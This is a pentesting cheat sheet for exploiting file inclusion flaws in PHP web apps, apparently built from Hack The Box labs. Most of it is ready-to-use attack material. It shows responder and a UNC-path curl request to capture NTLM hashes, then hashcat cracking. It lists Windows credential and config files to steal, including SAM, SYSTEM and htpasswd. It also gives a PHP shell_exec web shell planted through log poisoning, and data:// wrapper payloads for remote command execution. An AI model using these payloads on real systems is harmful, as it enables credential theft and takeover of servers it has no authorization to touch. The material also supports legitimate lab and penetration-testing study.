# RFI/LFI

### AD

If it’s in an active directory domain, you have the option to use responder to capture an LLMNR hash.

```coffeescript
# tab 1
responder -v -I tun0

#seperate tab
curl http://school.flight.htb/index.php?view=//10.10.16.48/TEST
```

![Untitled](RFI%20LFI%20f24166480c7046bd98d01a69a568d608/Untitled.png)

Crack hash

```coffeescript
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

# LFI

## View source code of php page with wrapper

```bash
php://filter/convert.base64-encode/resource=index
```

## Windows

Interesting files

```abap
# Files to find
C:\win.ini
C:\Windows\system.ini

# Apache logs
c:\xampp\apache\logs\access.log

# website root diretory (equivalent of /var/www)
C:\xampp\htdocs

# IIS logs are stored here
%SystemDrive%\inetpub\logs\LogFiles
%SystemDrive%\inetpub\logs\LogFiles\W3SVC4
%SystemDrive%\Windows\System32\LogFiles\HTTPERR

C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

### Log Poisoning

```abap
# send PHP payload
$ nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

# visit log file and use php to execute files
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

## Linux

### Interesting Files

```abap
/etc/vsftpd.conf
/var/www/html/wp-config.php
/var/www/html/webdav/passwd.dav
```

# Other

## Code execution through PHP wrappers

This one is slightly unrelated but it allows for code execution through PHP wrappers that use the `include()` function

```abap
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

As shown in [this article](https://www.aptive.co.uk/blog/local-file-inclusion-Lfi-testing/), you can also do something like this where you specify `cmd` in the url query parameters and send the php code in the post data

![Untitled](RFI%20LFI%20f24166480c7046bd98d01a69a568d608/Untitled%201.png)

If you’re uploading ZIP files, check this out for RCE [https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/)